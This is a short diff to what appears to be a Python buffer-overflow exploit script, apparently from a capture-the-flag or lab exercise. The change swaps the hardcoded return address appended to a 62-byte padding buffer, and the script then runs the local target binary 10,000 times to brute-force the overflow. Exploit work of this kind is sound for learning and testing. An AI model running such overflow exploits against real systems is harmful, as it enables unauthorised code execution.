@@ -25,7 +25,7 @@ if __name__ == '__main__':
 
     buf = ps(62,"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAABBBBCCCCDDDDEEEEFFFFGGGGHH")
     # print buf
-    input = buf + p32(0x565558c3)  # just find one address by gdb
+    input = buf + p32(0x565558bd)  # just find one address by gdb
     for i in range(10000):
         p = sp.Popen(cmds, env=env, stdin=sp.PIPE, universal_newlines=False)
         p.communicate(input)
